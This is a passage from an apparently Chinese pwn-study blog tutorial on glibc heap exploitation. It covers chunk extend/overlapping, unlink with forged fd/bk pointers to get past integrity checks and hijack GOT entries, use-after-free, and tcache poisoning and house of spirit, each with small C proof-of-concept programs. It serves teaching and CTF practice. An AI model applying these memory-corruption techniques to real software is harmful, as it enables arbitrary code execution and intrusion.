<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p>
</blockquote>
<p>三次 malloc 分配完以后，内存中的数据如下：</p>
<p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb1.png" srcset="/img/loading.gif" lazyload></p>
<p>修改size 数据后ptr1 和 ptr2 合并，如下：</p>
<p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb2.png" srcset="/img/loading.gif" lazyload></p>
<p>相应的 free 后进入了 unsorted bin</p>
<p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb3.png" srcset="/img/loading.gif" lazyload></p>
<p>再次分配我们就达到了overlapping chunk的目的。</p>
<h5 id="🌰3：对-free-的-unsortedbin-进行-extend"><a href="#🌰3：对-free-的-unsortedbin-进行-extend" class="headerlink" title="🌰3：对 free 的 unsortedbin 进行 extend"></a>🌰3：对 free 的 unsortedbin 进行 extend</h5><blockquote>
<p>在例二的基础上进行，先释放 chunk ，再修改</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>三次 malloc 之后的结果如下</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb1.png" srcset="/img/loading.gif" lazyload></p>
<p>释放 ptr1 后，chunk 进入 unsortedbin</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb2.png" srcset="/img/loading.gif" lazyload></p>
<p>修改 size 字段</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb3.png" srcset="/img/loading.gif" lazyload></p>
<p>再次分配，ptr2 头部被分配进新的堆块，我们就这样控制了 ptr2 的内容</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb4.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="🌰4：通过-extend-向后-overlapping"><a href="#🌰4：通过-extend-向后-overlapping" class="headerlink" title="🌰4：通过 extend 向后 overlapping"></a>🌰4：通过 extend 向后 overlapping</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2;<br><br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
<p>就像上面的例子，我们在两次free后可以发现bin 中出现了overlapping。</p>
<p>第一轮的 malloc 结束</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb1.png" srcset="/img/loading.gif" lazyload></p>
<p>修改 ptr1 的 size</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb2.png" srcset="/img/loading.gif" lazyload></p>
<p>两次 free，bin 中出现了overlapping。</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb3.png" srcset="/img/loading.gif" lazyload></p>
<p>而接下来的两次 malloc ，“ 两块 ” chunk 也被一次分配了</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb4.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb5.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="🌰5：通过-extend-向前-overlapping"><a href="#🌰5：通过-extend-向前-overlapping" class="headerlink" title="🌰5：通过 extend 向前 overlapping"></a>🌰5：通过 extend 向前 overlapping</h5><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);      <span class="hljs-comment">//smallbin1</span><br>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin1</span><br>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin2</span><br>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);     <span class="hljs-comment">//smallbin2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//防止与top合并</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;  <span class="hljs-comment">//修改pre_inuse域</span><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;  <span class="hljs-comment">//修改pre_size域</span><br>    <span class="hljs-built_in">free</span>(ptr4);  <span class="hljs-comment">//unlink进行前向extend</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);  <span class="hljs-comment">//占位块</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>第一次free后的堆结构如下</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb2.png" srcset="/img/loading.gif" lazyload></p>
<p>对数据进行修改后 <code>free(ptr4)</code> 可以发现 chunk 被合并了</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb3.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>unlink 机制的存在是为了防止内存过度碎片化。当一个 chunk 被释放时，该 chunk 非 fastbin 或 tcache bin ，libc 就会检查该堆块前后是否有 chunk 属于被释放的状态，如果存在，就会将他们从 bin 中取出进行合并，即使这些前后的堆块是在 fast bin 或者 tcache bin 中。</p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>unlink 的过程就类似于把双向链表中间的空闲 chunk 取出来，具体流程如下：</p>
<p>最初 bin 中的堆块像最上图那样链接，P 是我们释放的堆块， BK 是 P 对应链表前方的堆块， FD 是后面的堆块。unlink 结束后就变成了最下图，此时p 在 FD 的 data 中，然后 BK 和 FD 直接相连。</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink_intro.png" srcset="/img/loading.gif" lazyload></p>
<p>我们先从已经被淘汰的防护时的 unlink 开始学习其原理</p>
<h5 id="被淘汰的-unlink"><a href="#被淘汰的-unlink" class="headerlink" title="被淘汰的 unlink"></a>被淘汰的 unlink</h5><p>我们假设堆内的结构如以下左图，现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/old_unlink_vul.png" srcset="/img/loading.gif" lazyload></p>
<p>那么如果我们通过某种方式（比如溢出）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时，会依次进行下面的操作：</p>
<ul>
<li>glibc 判断这个块属于 small chunk</li>
<li>判断是否需要向前合并，发现前一个 chunk 处于使用状态，不需要向前合并</li>
<li>判断是否需要向后合并，后一个 chunk 空闲，需要合并</li>
<li>进行 unlink 操作</li>
</ul>
<p> unlink 具体执行的效果如下：</p>
<ul>
<li><p><code>FD = P-&gt;fd = target addr - 12</code>  ，即将 <em>FD</em> 字段赋值为堆块 P 的 <em>fd</em> 字段所存储的数据 target addr - 12 </p>
</li>
<li><p><code>BK = P-&gt;bk = expect value</code> ，即将 <em>BK</em> 字段赋值为堆块 P 的 <em>bk</em> 字段所存储的数据 expect value （我们预期改写的数据）。</p>
</li>
<li><p><code>FD-&gt;bk = BK</code> ，即将 <em>target addr - 12 + 12</em> 处的内容（ target addr 本身）设置为 expect value。</p>
</li>
<li><p><code>BK-&gt;fd = FD</code>，即将 <em>expect value + 8</em> 处的内容设置为 target addr - 12。</p>
</li>
</ul>
<p>在这里我们需要确保 expect value + 8 处的地址具有可写的权限，否则可能无法成功利用该漏洞。</p>
<p>成功执行 unlink 漏洞利用后，会将目标地址处的值设置为我们预期的内容，从而实现任意地址写操作。</p>
<p>我们可以利用这个漏洞来将某个 GOT 表项指向系统函数或者我们想要调用的函数，从而劫持程序执行流程。但是需要注意的是，expect value + 8 处的值也会被破坏，可能会影响程序的正常执行，因此在利用漏洞时需要仔细考虑和处理这些影响。</p>
<h3 id="当前的-unlink"><a href="#当前的-unlink" class="headerlink" title="当前的 unlink"></a>当前的 unlink</h3><p>哈哈哈，怎么会这么简单呢🤪</p>
<p>现在的 unlink 实现之前会对 chunk 的 size 和双向链表进行检查 ，具体代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 检查 P 的大小是否与其相邻堆块的 prev_size 字段一致（size检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 检查 P 的 fd 和 bk 指针是否与其前后双向链表节点的指针一致（双向链表完整性检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>&#125;<br><br><span class="hljs-comment">// 在 largebin 中，检查 P 的 next_size 指针是否与其前后双向链表节点的指针一致（双向链表完整性检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P || P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其中就有对 fd 和 bk 的检查。而上面的情况中，就会被检查出来，我们无法使用这种方法。</p>
<p>但是我们可以伪造堆块来绕过检查😎，我们有一个公式：</p>
<ol>
<li>P -&gt; fd -&gt; bk &#x3D;&#x3D; P &lt;&#x3D;&gt; *( P -&gt; fd + 0x18 ) &#x3D;&#x3D; P</li>
<li>p -&gt; bk -&gt; fd &#x3D;&#x3D; P &lt;&#x3D;&gt; *( p -&gt; bk + 0x10 ) &#x3D;&#x3D; P</li>
</ol>
<p>简单点说就是：</p>
<ol>
<li><strong>P -&gt; fd &#x3D; &amp; P - 0x18</strong></li>
<li><strong>P -&gt; bk &#x3D; &amp; P - 0x10</strong></li>
</ol>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink.png" srcset="/img/loading.gif" lazyload></p>
<p>触发unlink后P处的指针会变为 P-0x18 。</p>
<p>如果将上面说的P变为我们想要修改的地址比如保存指针的数组地址，利用上面说到的 unlink 就能控制数组中的指针，并且我们使指针保存类似 free_got、puts_got 等，之后我们修改指针使其为 system_got ，那么下次我们调用其他函数就会调用 system（）。</p>
<h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>Use After Free 就是内存块被释放以后再次被利用，有以下几种情况：</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL，再次利用时程序就会崩溃</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，而且然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序可以正常运转。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现问题。</li>
</ul>
<p>我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer （它的中文翻译叫迷途指针😊）。</p>
<p>它的实际应用就是我们在像是 chunk extend 里面用到的示例2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;  <span class="hljs-comment">// Use After Free</span><br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>





<h1 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h1><blockquote>
<p>这一部分我的环境是Ubuntu18 libc2.27</p>
</blockquote>
<h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>Tcache 全名为 Thread Local Caching，在 libc2.26 之后才出现。它为每个线程创建一个缓存，里面包含了一些小堆块。</p>
<p>Tcache bin 是单链表的数据结构，存储相同大小的空闲堆块，size大小范围是 0x20-0x410，允许存放的 chunk 数为7。当你使用 <code>free()</code> 函数释放一个堆块时，glibc 会将该堆块放入适当大小类别的 Tcache bin 中，以备后续再次分配。Tcache bin 采用先进后出的策略，且 prev_inuse 位不会被合并，也就是说 tcache bin 中的 chunk 不会被合并。</p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>在有了 tcache 机制以后，无论是分配还是释放堆块，tcache 都是首先被利用的，直到达到每一中 bin 的上限 7 为止。还有一种情况就是 fast bin 或者 small bin 返回了一个堆块，且 tcache 对应大小的 bin 中未满的话，那么该fast bin 或者 samll bin 链中的堆块会被加入到对应 tcache bin 中直至其上限。</p>
<h4 id="绕过-Tcache"><a href="#绕过-Tcache" class="headerlink" title="绕过 Tcache"></a>绕过 Tcache</h4><p>Tcache 机制无非就是增加了一层缓存，绕过 Tcache 就是我们手动构造填充堆块填满某一个大小对应的 thcache bin 链表，使得在再次回收的 bin 进入unsorted bin 或者 small bin，large bin 等等，再利用这些 bin 得到 libc 基址。</p>
<p>原理大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr[<span class="hljs-number">7</span>];<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>	<span class="hljs-comment">// 申请7个，释放7个，填满tcache bin[0x90]</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        ptr[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        <span class="hljs-built_in">free</span>(ptr[i]);<br>    <span class="hljs-comment">// 这里再释放a，就会放入到unsorted bin中</span><br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc addr is %llx\n&quot;</span>,  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/thcache-bypass.png" srcset="/img/loading.gif" lazyload></p>
<p>如上我们就泄露出了 main_arena 的地址，接下来就可以通过ret2libc时用到的套路泄露libc基址进而调用目标函数啦。</p>
<h4 id="分配堆到指定的地址"><a href="#分配堆到指定的地址" class="headerlink" title="分配堆到指定的地址"></a>分配堆到指定的地址</h4><p>在堆的利用中，我们经常会需要把堆的指针分配到我们想要的地址上去，比如BSS段或者直接指向栈空间实现程序流的操控，抑或是将堆块重新分配。</p>
<p>我们可以通过以下几种方法实现：</p>
<h5 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h5><p>tcache poisoning的利用思路如下：</p>
<ul>
<li><p>分配一个目标大小的堆块，再将其释放</p>
</li>
<li><p>利用堆溢出等漏洞，将刚刚释放的堆块的某个指针（例如 <code>fd</code> 或 <code>bk</code> ）修改为我们可控的地址指针（如 <code>__free_hook </code>或 <code>__malloc_hook</code> 等局部变量的地址）。</p>
</li>
<li><p>再次建立相同大小的堆块并释放，这样该堆块的内容会被认为是一个有效的 tcache 链表节点。</p>
</li>
<li><p>再次建立相同大小的堆块，此时 tcache 会将之前填充的目标指针地址作为返回值返回给调用者，我们可以在这段地址内写入攻击代码，程序执行到目标地址，就可以实现任意代码执行。</p>
<blockquote>
<p>因为 fd 指针会返回空闲堆块地址给程序，而这个地址被我们替换成了目标地址，所以实际上返回值是目标地</p>
</blockquote>
</li>
</ul>
<p> 原理大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> localVariables ;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;localVariables addr is %p\n&quot;</span>, &amp;localVariables);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr addr is %p\n&quot;</span>, ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-comment">// 只需修改fd指针，申请的大小和当前tcache bin大小相同即可</span><br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)&amp;localVariables;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the second malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachePoisoning.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h5><p>tcache house of spirit 这种利用方式是由于 tcache_put() 函数检查不严格导致的，在释放的时候没有检查被释放的指针是否真的是堆块的 malloc 指针，我们就可以伪造一个 fake_chunk 来跳转到目标地址。</p>
<p>利用思路是伪造一个 size 符合 tcache bin size 的 fake_chunk ，使程序在释放时误以为他们属于 tcache 的管理范围，就实现了任意地址的目的的。</p>
<p>原理大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 初始化堆环境</span><br>    <br>    <span class="hljs-comment">// 伪造假堆块，试图释放后再次分配得到该地址的堆块</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>, fck+<span class="hljs-number">2</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90</span>;<br>    <span 